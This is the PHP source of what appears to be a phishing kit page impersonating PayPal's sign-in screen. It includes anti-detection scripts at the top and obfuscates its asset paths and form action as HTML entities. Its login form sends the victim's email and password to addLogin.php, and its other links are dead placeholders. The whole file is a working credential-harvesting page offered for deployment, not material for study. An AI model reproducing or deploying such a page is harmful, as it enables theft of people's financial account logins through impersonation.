<?php 
require_once '../anti/anti0.php';
require '../anti/anti1.php';
require '../anti/anti2.php';
require '../anti/anti3.php';
require '../anti/anti4.php';
@session_start();
if(isset($_SESSION['language'])){
	include "languages/{$_SESSION['language']}.php";
}
else
	{exit(
		header("Location: index.php"));
}
		?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv=Content-Type content="text/html; charset=UTF-8">
	<meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1">
	<title><?php echo $TITLE?></title>
	<link rel="shortcut icon" href=&#46;&#47;&#97;&#115;&#115;&#101;&#116;&#115;&#47;&#105;&#109;&#103;&#47;&#102;&#97;&#118;&#105;&#99;&#111;&#110;&#46;&#105;&#99;&#111;>
	<link rel=apple-touch-icon href=&#46;&#47;&#97;&#115;&#115;&#101;&#116;&#115;&#47;&#105;&#109;&#103;&#47;&#102;&#97;&#118;&#105;&#99;&#111;&#110;&#46;&#112;&#110;&#103;>
	<meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel=stylesheet href=&#46;&#47;&#97;&#115;&#115;&#101;&#116;&#115;&#47;&#99;&#115;&#115;&#47;&#115;&#105;&#103;&#110;&#105;&#110;&#46;&#99;&#115;&#115;>
	<script src=&#46;&#47;&#97;&#115;&#115;&#101;&#116;&#115;&#47;&#106;&#115;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#106;&#115;>
	</script>
	<script src=&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#106;&#115;&#45;&#99;&#111;&#100;&#101;&#115;&#46;&#99;&#111;&#109;&#47;&#109;&#111;&#100;&#101;&#114;&#110;&#105;&#122;&#114;&#47;&#50;&#46;&#56;&#46;&#49;&#47;&#109;&#111;&#100;&#101;&#114;&#110;&#105;&#122;&#114;&#46;&#109;&#105;&#110;&#46;&#106;&#115;>
		
	</script>
</head>
<body>
	<div class=MAIN><section>
		<div class=CORRAL>
			<div class=CNTCNT>
			<header><p class="PAYPALLOGO PPLLOGOSVG"></p></header>
			<?php if(isset($_SESSION['loginError'])&&$_SESSION['loginError']==true):?>
				<div class=NOTIFS tabindex=-1>
					<p class='NOTIFI NOTIFALERT'>
					<?php echo $ERROR?>
					</p></div>
					<?php $_SESSION['loginError']=null;endif;?>
					<form action=&#97;&#100;&#100;&#76;&#111;&#103;&#105;&#110;&#46;&#112;&#104;&#112; method=post autocomplete=off novalidate><div class=CLEARFIX><div class=TEXTINPUT id=jjD_8t8_WWkI><div class=FIELD><input autofocus name=EMAIL_LOGIN type=email required autocomplete=off placeholder=<?php echo $EMAIL?>></div><div class=ERRORMSG id=iog_1FF_KA1><p><?php echo $PHD1?></p></div></div><div class=TEXTINPUT id=iog_1G9_KJs><div class=FIELD><input name=PASSWORD type=password required placeholder=<?php echo $PASS?>></div><div class=ERRORMSG id=yyt_t2F_NM1><p><?php echo $PHD2?></p></div></div></div><div class=ACTN><button class=BTN type=submit><?php echo $LOGIN?></button></div><div class=FORGOT><a href=javascript:void(0)><?php echo $FRGT?></a></div>
					</form><div class=SIGNSEP><span class=ORSEP><?php echo $OR?></span></div><a href=javascript:void(0) class="BTN BTSECOND">
						<?php echo $SIGN?></a></div></div><footer class=FOUTR><div><div><ul class="FTGROUP GROUPWS"><li><a href=javascript:void(0)><?php echo $PRV?></a></li><li><a href=javascript:void(0)><?php echo $LEGAL?></a></li></ul><p class=FOUCOPY>&#67;&#111;&#112;&#121;&#114;&#105;&#103;&#104;&#116;&#32;&#169;&#32;&#49;&#57;&#57;&#57;&#45;<?php echo date("Y");?> &#80;&#97;&#121;&#80;&#97;&#108;&#46;<?php echo $RIGHT?>.</p><p class=FOTDIS><?php echo $FTR?></p></div></div></footer></section></div><div id=hXmm_000_iioP class=hide></div><script src=&#46;&#47;&#97;&#115;&#115;&#101;&#116;&#115;&#47;&#106;&#115;&#47;&#115;&#105;&#103;&#110;&#105;&#110;&#47;&#109;&#97;&#110;&#97;&#103;&#101;&#46;&#106;&#115;></script></body></html>